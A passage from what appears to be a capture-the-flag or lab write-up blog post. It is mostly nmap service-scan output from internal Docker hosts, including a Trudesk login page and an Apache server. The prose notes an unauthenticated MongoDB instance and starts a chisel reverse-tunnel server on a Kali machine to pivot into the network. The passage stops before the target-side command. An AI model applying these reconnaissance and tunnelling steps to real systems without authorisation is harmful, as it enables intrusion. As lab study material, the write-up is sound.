+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(GetRequest,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(HT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:TPOptions,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(RTSPRequest,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(RPCCheck,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(DNS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:VersionBindReqTCP,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(DNSStatusRequestT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:CP,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x1a\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(Help,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\0&#34;)%r(SSLSessionReq,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>0fInvalid<span style="color:#ae81ff">\x</span>20message<span style="color:#ae81ff">\&#34;\x</span>05HY000<span style="color:#e6db74">&#34;)%r(TerminalServerCo
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:okie,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(TLSSessionReq,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>
+</span></span><span style="display:flex;"><span>SF:0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x1a\x0fInvalid\x20messa
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ge\&#34;\x05HY000&#34;)%r(Kerberos,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(SMBProgN
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:eg,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(X11Probe,2B,&#34;\x05\0\0\0\x0b\x08\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>0fInvalid<span style="color:#ae81ff">\x</span>20message<span style="color:#ae81ff">\&#34;\x</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>SF:5HY000<span style="color:#e6db74">&#34;)%r(FourOhFourRequest,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(LPDStr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ing,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(LDAPSearchReq,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span><span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>SF:b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x1a\x0fInvalid\x20messag
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:e\&#34;\x05HY000&#34;)%r(LDAPBindReq,46,&#34;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x01\x08\x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\*</span>Parse<span style="color:#ae81ff">\x</span>20error<span style="color:#ae81ff">\x</span>20unserializing<span style="color:#ae81ff">\x</span>20protobuf<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20message<span style="color:#ae81ff">\&#34;\x</span>05HY000<span style="color:#e6db74">&#34;)%r(SIPOptions,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:(LANDesk-RC,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(TerminalServer,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:0<span style="color:#ae81ff">\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(NCP,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(Not
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:esRPC,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#e6db74">&#39;\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:1a\x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(JavaRMI,9,&#34;\x05\0\0\0\x0b\x08\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:05\x1a\0&#34;)%r(WMSRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(oracle-tns,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:32,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>16Inv
+</span></span><span style="display:flex;"><span>SF:alid<span style="color:#ae81ff">\x</span>20message-frame<span style="color:#ae81ff">\.\&#34;\x</span>05HY000<span style="color:#e6db74">&#34;)%r(ms-sql-s,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(afp,2B,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0\x</span>1e<span style="color:#ae81ff">\0\0\0\x</span>01<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">01</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>88<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>0fInvalid<span style="color:#ae81ff">\x</span>20message<span style="color:#ae81ff">\&#34;\x</span>05HY000<span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap scan report for 172.17.0.5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host is up (0.00015s latency).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Not shown: 65534 closed tcp ports (conn-refused)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">PORT     STATE SERVICE  VERSION
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">8118/tcp open  privoxy?
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| fingerprint-strings: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   DNSVersionBindReqTCP, RPCCheck, RTSPRequest: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 400 Bad Request
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   GetRequest: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 200 OK
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Origin: *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Headers: DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,accesstoken,X-RToken,X-Token
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/html; charset=utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 7285
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     ETag: W/&#34;</span>1c75-WUVJYgy+76qLc2hldkHzGR7+Uxg<span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     set-cookie: connect.sid=s%3AO5e1S-uwVRl259ATIP02HJYZhPgPiVIH.o2MGZWzTfKSYRWeP0MydfcXvWha3aN%2Bx%2BiPyTdTBt1s; Path=/; Expires=Sun, 03 Dec 2023 10:55:28 GMT; HttpOnly
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Sat, 03 Dec 2022 10:55:28 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;!DOCTYPE html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;head&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;title&gt;Trudesk &amp;middot; Login&lt;/title&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>/css/plugins.min.css<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>/css/app.min.css<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;style type=&#34;</span>text/css<span style="color:#e6db74">&#34;&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     html {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     overflow-x: hidden;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     body {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   HTTPOptions: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 200 OK
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Origin: *
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Methods: GET, POST, PUT, DELETE, PATCH, OPTIONS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Access-Control-Allow-Headers: DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,accesstoken,X-RToken,X-Token
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/plain; charset=utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     ETag: W/&#34;</span>2-nOO9QiTIwXgNtWtBJezz8kv3SLc<span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Sat, 03 Dec 2022 10:55:33 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port8118-TCP:V=7.91SVN%I=7%D=12/3%Time=638B2B20%P=x86_64-pc-linux-musl%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r(GetRequest,1ED8,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Access-Control-Allow-Origi
+</span></span><span style="display:flex;"><span>SF:n:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\*\r\n</span>Access-Control-Allow-Methods:<span style="color:#ae81ff">\x</span>20GET,<span style="color:#ae81ff">\x</span>20POST,<span style="color:#ae81ff">\x</span>20PUT,<span style="color:#ae81ff">\x</span>20D
+</span></span><span style="display:flex;"><span>SF:ELETE,<span style="color:#ae81ff">\x</span>20PATCH,<span style="color:#ae81ff">\x</span>20OPTIONS<span style="color:#ae81ff">\r\n</span>Access-Control-Allow-Headers:<span style="color:#ae81ff">\x</span>20DNT,X-M
+</span></span><span style="display:flex;"><span>SF:x-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cac
+</span></span><span style="display:flex;"><span>SF:he-Control,Content-Type,accesstoken,X-RToken,X-Token<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>207285<span style="color:#ae81ff">\r\n</span>ETag:<span style="color:#ae81ff">\x</span>20W/
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\&#34;</span>1c75-WUVJYgy<span style="color:#ae81ff">\+</span>76qLc2hldkHzGR7<span style="color:#ae81ff">\+</span>Uxg<span style="color:#ae81ff">\&#34;\r\n</span>set-cookie:<span style="color:#ae81ff">\x</span>20connect<span style="color:#ae81ff">\.</span>sid<span style="color:#f92672">=</span>s
+</span></span><span style="display:flex;"><span>SF:%3AO5e1S-uwVRl259ATIP02HJYZhPgPiVIH<span style="color:#ae81ff">\.</span>o2MGZWzTfKSYRWeP0MydfcXvWha3aN%2Bx
+</span></span><span style="display:flex;"><span>SF:%2BiPyTdTBt1s;<span style="color:#ae81ff">\x</span>20Path<span style="color:#f92672">=</span>/;<span style="color:#ae81ff">\x</span>20Expires<span style="color:#f92672">=</span>Sun,<span style="color:#ae81ff">\x</span>2003<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202023<span style="color:#ae81ff">\x</span>2010:55
+</span></span><span style="display:flex;"><span>SF::28<span style="color:#ae81ff">\x</span>20GMT;<span style="color:#ae81ff">\x</span>20HttpOnly<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Sat,<span style="color:#ae81ff">\x</span>2003<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span>202022<span style="color:#ae81ff">\x</span>2010:55:
+</span></span><span style="display:flex;"><span>SF:28<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>&lt;!DOCTYPE<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html&gt;<span style="color:#ae81ff">\n</span>&lt;h
+</span></span><span style="display:flex;"><span>SF:ead&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Trudesk<span style="color:#ae81ff">\x</span>20&amp;middot;<span style="color:#ae81ff">\x</span>20Login&lt;/title&gt;<span style="color:#ae81ff">\n\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/css/plugins<span style="color:#ae81ff">\.</span>min<span style="color:#ae81ff">\.</span>cs
+</span></span><span style="display:flex;"><span>SF:s<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/css/app<span style="color:#ae81ff">\.</span>m
+</span></span><span style="display:flex;"><span>SF:in<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;style<span style="color:#ae81ff">\x</span>20type<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>text/css<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20html<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20overflow-x:<span style="color:#ae81ff">\x</span>20hidden;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">}</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20body<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span><span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:)%r(HTTPOptions,1BA,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Access-Control-Allow-Ori
+</span></span><span style="display:flex;"><span>SF:gin:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\*\r\n</span>Access-Control-Allow-Methods:<span style="color:#ae81ff">\x</span>20GET,<span style="color:#ae81ff">\x</span>20POST,<span style="color:#ae81ff">\x</span>20PUT,<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>SF:0DELETE,<span style="color:#ae81ff">\x</span>20PATCH,<span style="color:#ae81ff">\x</span>20OPTIONS<span style="color:#ae81ff">\r\n</span>Access-Control-Allow-Headers:<span style="color:#ae81ff">\x</span>20DNT,X
+</span></span><span style="display:flex;"><span>SF:-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,C
+</span></span><span style="display:flex;"><span>SF:ache-Control,Content-Type,accesstoken,X-RToken,X-Token<span style="color:#ae81ff">\r\n</span>Content-Type:
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>202<span style="color:#ae81ff">\r\n</span>ETag:<span style="color:#ae81ff">\x</span>20W/
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\&#34;</span>2-nOO9QiTIwXgNtWtBJezz8kv3SLc<span style="color:#ae81ff">\&#34;\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Sat,<span style="color:#ae81ff">\x</span>2003<span style="color:#ae81ff">\x</span>20Dec<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">202022</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>2010:55:33<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>OK<span style="color:#e6db74">&#34;)%r(RTSPRequest,2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:F,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:%r(RPCCheck,2F,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20cl
+</span></span><span style="display:flex;"><span>SF:ose<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;)%r(DNSVersionBindReqTCP,2F,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Req
+</span></span><span style="display:flex;"><span>SF:uest<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap scan report for 3c371615b7aa (172.17.0.6)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host is up (0.00013s latency).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Not shown: 65534 closed tcp ports (conn-refused)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">PORT   STATE SERVICE VERSION
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">80/tcp open  http    Apache httpd 2.4.51
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-server-header: Apache/2.4.51 (Debian)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: 403 Forbidden
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: Host: 172.17.0.6
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 16 IP addresses (6 hosts up) scanned in 51.74 seconds
+</span></span></span></code></pre></div><h3 id="finding-an-open-mongodb-instance">Finding An Open Mongodb Instance</h3>
+<p>From the scan above, I can see that <em>mongodb</em> is open on <em>172.17.0.3</em> and that it doesn&rsquo;t require any password to log in, since <em>nmap</em> was able to list the databases.</p>
+<p><img src="mongodb_scan.png" alt="Listing Mongodb Tables"></p>
+<p>So, now I&rsquo;ll use <em>chisel</em> to port forward the port back to my machine so that I can access it using <code>mongosh</code>.</p>
+<ul>
+<li>If you don&rsquo;t have it you can follow the installation instructions from here: <em>
+
+<a href="https://www.mongodb.com/docs/mongodb-shell/install/" target="_blank">https://www.mongodb.com/docs/mongodb-shell/install/</a></em></li>
+<li>Uploading <em>Chisel</em>:
+<img src="uploading_chisel.png" alt="Uploading Chisel"></li>
+</ul>
+<p>On my kali machine:</p>
+<pre tabindex="0"><code>./chisel_1.7.7_linux_amd64 server -p 9001 --reverse
+</code></pre><p>On the target machine:</p>
